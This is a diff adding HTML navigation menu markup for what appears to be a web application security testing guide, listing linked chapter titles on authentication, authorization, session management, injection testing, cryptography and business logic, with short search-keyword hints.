+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/06-Testing_for_Browser_Cache_Weaknesses" title="4.4.6 Testing for Browser Cache Weaknesses">4.4.6 Testing for Browser Cache Weaknesses</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.7 Testing for Weak Password Policy" data-hints="wstg-athn-07 athn-07">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/07-Testing_for_Weak_Password_Policy" title="4.4.7 Testing for Weak Password Policy">4.4.7 Testing for Weak Password Policy</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.8 Testing for Weak Security Question Answer" data-hints="wstg-athn-08 athn-08">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer" title="4.4.8 Testing for Weak Security Question Answer">4.4.8 Testing for Weak Security Question Answer</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.9 Testing for Weak Password Change or Reset Functionalities" data-hints="wstg-athn-09 athn-09">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/09-Testing_for_Weak_Password_Change_or_Reset_Functionalities" title="4.4.9 Testing for Weak Password Change or Reset Functionalities">4.4.9 Testing for Weak Password Change or Reset Functionalities</a>
+</li>
+<li class="wstg-nav-item" data-title="4.4.10 Testing for Weaker Authentication in Alternative Channel" data-hints="wstg-athn-10 athn-10">
+<a href="/v4.2/4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel" data-nav-url="4-Web_Application_Security_Testing/04-Authentication_Testing/10-Testing_for_Weaker_Authentication_in_Alternative_Channel" title="4.4.10 Testing for Weaker Authentication in Alternative Channel">4.4.10 Testing for Weaker Authentication in Alternative Channel</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.5 Authorization Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/05-Authorization_Testing/" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/" title="4.5 Authorization Testing">4.5 Authorization Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.5.1 Testing Directory Traversal File Include" data-hints="path traversal dotdot lfi wstg-athz-01 athz-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include" title="4.5.1 Testing Directory Traversal File Include">4.5.1 Testing Directory Traversal File Include</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.2 Testing for Bypassing Authorization Schema" data-hints="wstg-athz-02 athz-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema" title="4.5.2 Testing for Bypassing Authorization Schema">4.5.2 Testing for Bypassing Authorization Schema</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.3 Testing for Privilege Escalation" data-hints="privesc wstg-athz-03 athz-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/03-Testing_for_Privilege_Escalation" title="4.5.3 Testing for Privilege Escalation">4.5.3 Testing for Privilege Escalation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.5.4 Testing for Insecure Direct Object References" data-hints="idor wstg-athz-04 athz-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" data-nav-url="4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References" title="4.5.4 Testing for Insecure Direct Object References">4.5.4 Testing for Insecure Direct Object References</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.6 Session Management Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/" title="4.6 Session Management Testing">4.6 Session Management Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.6.1 Testing for Session Management Schema" data-hints="wstg-sess-01 sess-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/01-Testing_for_Session_Management_Schema" title="4.6.1 Testing for Session Management Schema">4.6.1 Testing for Session Management Schema</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.2 Testing for Cookies Attributes" data-hints="cookies set-cookie httponly samesite secure flag wstg-sess-02 sess-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes" title="4.6.2 Testing for Cookies Attributes">4.6.2 Testing for Cookies Attributes</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.3 Testing for Session Fixation" data-hints="wstg-sess-03 sess-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation" title="4.6.3 Testing for Session Fixation">4.6.3 Testing for Session Fixation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.4 Testing for Exposed Session Variables" data-hints="wstg-sess-04 sess-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables" title="4.6.4 Testing for Exposed Session Variables">4.6.4 Testing for Exposed Session Variables</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.5 Testing for Cross Site Request Forgery" data-hints="csrf xsrf wstg-sess-05 sess-05">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery" title="4.6.5 Testing for Cross Site Request Forgery">4.6.5 Testing for Cross Site Request Forgery</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.6 Testing for Logout Functionality" data-hints="wstg-sess-06 sess-06">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/06-Testing_for_Logout_Functionality" title="4.6.6 Testing for Logout Functionality">4.6.6 Testing for Logout Functionality</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.7 Testing Session Timeout" data-hints="wstg-sess-07 sess-07">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/07-Testing_Session_Timeout" title="4.6.7 Testing Session Timeout">4.6.7 Testing Session Timeout</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.8 Testing for Session Puzzling" data-hints="wstg-sess-08 sess-08">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/08-Testing_for_Session_Puzzling" title="4.6.8 Testing for Session Puzzling">4.6.8 Testing for Session Puzzling</a>
+</li>
+<li class="wstg-nav-item" data-title="4.6.9 Testing for Session Hijacking" data-hints="wstg-sess-09 sess-09">
+<a href="/v4.2/4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking" data-nav-url="4-Web_Application_Security_Testing/06-Session_Management_Testing/09-Testing_for_Session_Hijacking" title="4.6.9 Testing for Session Hijacking">4.6.9 Testing for Session Hijacking</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.7 Input Validation Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/" title="4.7 Input Validation Testing">4.7 Input Validation Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.7.1 Testing for Reflected Cross Site Scripting" data-hints="xss wstg-inpv-01 inpv-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting" title="4.7.1 Testing for Reflected Cross Site Scripting">4.7.1 Testing for Reflected Cross Site Scripting</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.2 Testing for Stored Cross Site Scripting" data-hints="xss wstg-inpv-02 inpv-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting" title="4.7.2 Testing for Stored Cross Site Scripting">4.7.2 Testing for Stored Cross Site Scripting</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.3 Testing for HTTP Verb Tampering" data-hints="verb tampering wstg-inpv-03 inpv-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/03-Testing_for_HTTP_Verb_Tampering" title="4.7.3 Testing for HTTP Verb Tampering">4.7.3 Testing for HTTP Verb Tampering</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.4 Testing for HTTP Parameter Pollution" data-hints="hpp wstg-inpv-04 inpv-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution" title="4.7.4 Testing for HTTP Parameter Pollution">4.7.4 Testing for HTTP Parameter Pollution</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5 Testing for SQL Injection" data-hints="sqli wstg-inpv-05 inpv-05">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection" title="4.7.5 Testing for SQL Injection">4.7.5 Testing for SQL Injection</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.7.5.1 Testing for Oracle">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.1-Testing_for_Oracle" title="4.7.5.1 Testing for Oracle">4.7.5.1 Testing for Oracle</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.2 Testing for MySQL">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.2-Testing_for_MySQL" title="4.7.5.2 Testing for MySQL">4.7.5.2 Testing for MySQL</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.3 Testing for SQL Server" data-hints="mssql sql server">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server" title="4.7.5.3 Testing for SQL Server">4.7.5.3 Testing for SQL Server</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.4 Testing PostgreSQL">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL" title="4.7.5.4 Testing PostgreSQL">4.7.5.4 Testing PostgreSQL</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.5 Testing for MS Access">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access" title="4.7.5.5 Testing for MS Access">4.7.5.5 Testing for MS Access</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.6 Testing for NoSQL Injection" data-hints="sqli nosqli">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection" title="4.7.5.6 Testing for NoSQL Injection">4.7.5.6 Testing for NoSQL Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.7 Testing for ORM Injection">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.7-Testing_for_ORM_Injection" title="4.7.5.7 Testing for ORM Injection">4.7.5.7 Testing for ORM Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.5.8 Testing for Client-side">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.8-Testing_for_Client-side" title="4.7.5.8 Testing for Client-side">4.7.5.8 Testing for Client-side</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.7.6 Testing for LDAP Injection" data-hints="ldapi wstg-inpv-06 inpv-06">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection" title="4.7.6 Testing for LDAP Injection">4.7.6 Testing for LDAP Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.7 Testing for XML Injection" data-hints="xxe xmli xml injection wstg-inpv-07 inpv-07">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection" title="4.7.7 Testing for XML Injection">4.7.7 Testing for XML Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.8 Testing for SSI Injection" data-hints="ssi injection wstg-inpv-08 inpv-08">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection" title="4.7.8 Testing for SSI Injection">4.7.8 Testing for SSI Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.9 Testing for XPath Injection" data-hints="xpathi xml wstg-inpv-09 inpv-09">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_XPath_Injection" title="4.7.9 Testing for XPath Injection">4.7.9 Testing for XPath Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.10 Testing for IMAP SMTP Injection" data-hints="email injection wstg-inpv-10 inpv-10">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/10-Testing_for_IMAP_SMTP_Injection" title="4.7.10 Testing for IMAP SMTP Injection">4.7.10 Testing for IMAP SMTP Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.11 Testing for Code Injection" data-hints="rce wstg-inpv-11 inpv-11">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/11-Testing_for_Code_Injection" title="4.7.11 Testing for Code Injection">4.7.11 Testing for Code Injection</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.7.11.1 Testing for Local File Inclusion" data-hints="lfi rfi">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion" title="4.7.11.1 Testing for Local File Inclusion">4.7.11.1 Testing for Local File Inclusion</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.11.2 Testing for Remote File Inclusion" data-hints="lfi rfi">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion" title="4.7.11.2 Testing for Remote File Inclusion">4.7.11.2 Testing for Remote File Inclusion</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.7.12 Testing for Command Injection" data-hints="rce cmdi os command wstg-inpv-12 inpv-12">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection" title="4.7.12 Testing for Command Injection">4.7.12 Testing for Command Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.13 Testing for Format String Injection" data-hints="format string bug wstg-inpv-13 inpv-13">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/13-Testing_for_Format_String_Injection" title="4.7.13 Testing for Format String Injection">4.7.13 Testing for Format String Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.14 Testing for Incubated Vulnerability" data-hints="wstg-inpv-14 inpv-14">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/14-Testing_for_Incubated_Vulnerability" title="4.7.14 Testing for Incubated Vulnerability">4.7.14 Testing for Incubated Vulnerability</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.15 Testing for HTTP Splitting Smuggling" data-hints="wstg-inpv-15 inpv-15">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/15-Testing_for_HTTP_Splitting_Smuggling" title="4.7.15 Testing for HTTP Splitting Smuggling">4.7.15 Testing for HTTP Splitting Smuggling</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.16 Testing for HTTP Incoming Requests" data-hints="wstg-inpv-16 inpv-16">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests" title="4.7.16 Testing for HTTP Incoming Requests">4.7.16 Testing for HTTP Incoming Requests</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.17 Testing for Host Header Injection" data-hints="host header injection headers wstg-inpv-17 inpv-17">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/17-Testing_for_Host_Header_Injection" title="4.7.17 Testing for Host Header Injection">4.7.17 Testing for Host Header Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.18 Testing for Server-side Template Injection" data-hints="ssti wstg-inpv-18 inpv-18">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection" title="4.7.18 Testing for Server-side Template Injection">4.7.18 Testing for Server-side Template Injection</a>
+</li>
+<li class="wstg-nav-item" data-title="4.7.19 Testing for Server-Side Request Forgery" data-hints="ssrf wstg-inpv-19 inpv-19">
+<a href="/v4.2/4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" data-nav-url="4-Web_Application_Security_Testing/07-Input_Validation_Testing/19-Testing_for_Server-Side_Request_Forgery" title="4.7.19 Testing for Server-Side Request Forgery">4.7.19 Testing for Server-Side Request Forgery</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.8 Testing for Error Handling">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/" data-nav-url="4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/" title="4.8 Testing for Error Handling">4.8 Testing for Error Handling</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.8.1 Testing for Improper Error Handling" data-hints="wstg-errh-01 errh-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling" data-nav-url="4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/01-Testing_For_Improper_Error_Handling" title="4.8.1 Testing for Improper Error Handling">4.8.1 Testing for Improper Error Handling</a>
+</li>
+<li class="wstg-nav-item" data-title="4.8.2 Testing for Stack Traces" data-hints="wstg-errh-02 errh-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces" data-nav-url="4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/02-Testing_for_Stack_Traces" title="4.8.2 Testing for Stack Traces">4.8.2 Testing for Stack Traces</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.9 Testing for Weak Cryptography">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/" title="4.9 Testing for Weak Cryptography">4.9 Testing for Weak Cryptography</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.9.1 Testing for Weak Transport Layer Security" data-hints="tls ssl https wstg-cryp-01 cryp-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/01-Testing_for_Weak_Transport_Layer_Security" title="4.9.1 Testing for Weak Transport Layer Security">4.9.1 Testing for Weak Transport Layer Security</a>
+</li>
+<li class="wstg-nav-item" data-title="4.9.2 Testing for Padding Oracle" data-hints="padding oracle attack wstg-cryp-02 cryp-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/02-Testing_for_Padding_Oracle" title="4.9.2 Testing for Padding Oracle">4.9.2 Testing for Padding Oracle</a>
+</li>
+<li class="wstg-nav-item" data-title="4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels" data-hints="tls ssl https cleartext wstg-cryp-03 cryp-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels" title="4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels">4.9.3 Testing for Sensitive Information Sent via Unencrypted Channels</a>
+</li>
+<li class="wstg-nav-item" data-title="4.9.4 Testing for Weak Encryption" data-hints="wstg-cryp-04 cryp-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption" data-nav-url="4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/04-Testing_for_Weak_Encryption" title="4.9.4 Testing for Weak Encryption">4.9.4 Testing for Weak Encryption</a>
+</li>
+</ul>
+</details>
+</li>
+<li class="wstg-nav-item" data-title="4.10 Business Logic Testing">
+<details>
+<summary>
+<span class="wstg-nav-summary-row">
+<span class="wstg-nav-chevron" aria-hidden="true"></span>
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/" title="4.10 Business Logic Testing">4.10 Business Logic Testing</a>
+</span>
+</summary>
+<ul>
+<li class="wstg-nav-item" data-title="4.10.0 Introduction to Business Logic">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic" title="4.10.0 Introduction to Business Logic">4.10.0 Introduction to Business Logic</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.1 Test Business Logic Data Validation" data-hints="wstg-busl-01 busl-01">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation" title="4.10.1 Test Business Logic Data Validation">4.10.1 Test Business Logic Data Validation</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.2 Test Ability to Forge Requests" data-hints="wstg-busl-02 busl-02">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests" title="4.10.2 Test Ability to Forge Requests">4.10.2 Test Ability to Forge Requests</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.3 Test Integrity Checks" data-hints="wstg-busl-03 busl-03">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks" title="4.10.3 Test Integrity Checks">4.10.3 Test Integrity Checks</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.4 Test for Process Timing" data-hints="race condition toctou wstg-busl-04 busl-04">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing" title="4.10.4 Test for Process Timing">4.10.4 Test for Process Timing</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.5 Test Number of Times a Function Can Be Used Limits" data-hints="rate limit bruteforce brute force wstg-busl-05 busl-05">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits" title="4.10.5 Test Number of Times a Function Can Be Used Limits">4.10.5 Test Number of Times a Function Can Be Used Limits</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.6 Testing for the Circumvention of Work Flows" data-hints="wstg-busl-06 busl-06">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows" title="4.10.6 Testing for the Circumvention of Work Flows">4.10.6 Testing for the Circumvention of Work Flows</a>
+</li>
+<li class="wstg-nav-item" data-title="4.10.7 Test Defenses Against Application Misuse" data-hints="wstg-busl-07 busl-07">
+<a href="/v4.2/4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse" data-nav-url="4-Web_Application_Security_Testing/10-Business_Logic_Testing/07-Test_Defenses_Against_Application_Misuse" title="4.10.7 Test Defenses Against Application Misuse">4.10.7 Test Defenses Against Application Misuse</a>
